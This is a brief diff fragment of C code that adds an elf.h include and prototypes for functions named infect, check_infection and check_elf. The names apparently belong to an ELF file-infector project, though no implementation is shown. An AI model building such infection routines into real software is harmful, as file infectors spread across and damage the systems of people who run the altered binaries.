@@ -8,3 +8,8 @@
 #include <fcntl.h>
 #include <errno.h>
 #include <unistd.h>
+#include <elf.h>
+
+void    infect(FILE *fp, const char *string, size_t len);
+bool    check_infection(FILE *fp, const char *string, size_t len);
+bool    check_elf(FILE *fp, int arch);
